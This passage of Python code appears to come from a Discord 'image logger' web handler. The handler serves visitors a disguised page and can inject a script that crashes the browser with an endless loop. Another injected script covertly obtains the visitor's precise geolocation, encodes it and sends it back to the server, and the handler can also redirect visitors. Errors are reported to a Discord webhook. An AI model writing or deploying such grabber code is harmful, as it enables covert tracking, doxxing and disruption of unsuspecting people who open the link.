                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
